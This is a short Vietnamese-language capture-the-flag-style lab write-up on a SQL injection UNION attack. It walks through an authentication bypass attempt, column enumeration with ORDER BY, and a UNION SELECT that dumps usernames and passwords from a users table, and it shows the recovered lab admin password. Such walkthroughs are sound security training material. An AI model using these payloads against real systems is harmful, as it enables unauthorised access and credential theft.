# SQL injection UNION attack, retrieving data from other tables

Bài lab này yêu cầu ta đăng nhập vào hệ thống với quyền quản trị viên.
Ta thử bypass cơ bản xem sao:
`administrator'--`
`123456`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134117113221615646/image.png)

Hmm... Không được rồi, vậy là ta cần phải biết được chính xác `username` và `password` của quản trị viên. Thử kiểm tra xem trong bảng của database có bao nhiêu cột và trong đó có thông tin về `username`, `password` không nhé!

- `filter?category=' ORDER BY 2--` ( Vậy là có 2 cột trong bảng của databse).

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134118253908742244/image.png)

Tiếp theo ta thử kiểm tra xem kiểu dữ liệu trong 2 cột trên có chứa kiểu văn bản không nhé!

- `' UNION SELECT 'ahihi','ehehe'--`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134120162350616778/image.png)

Giờ ta chỉ cần truy cập vào dữ liệu của 2 cột trong bảng của database thui, thường thì thông tin của người dùng là `username`, `password` và thường đặt tên bảng là `users`

- `' UNION SELECT username, password FROM users--`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134121087408541747/image.png)

Vậy là đã có thông tin để đăng nhập vào tài khoản quản trị viên:
- `administrator`
- `ch7ab0br2jjk6gpxikbw`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1134121634375159878/image.png)
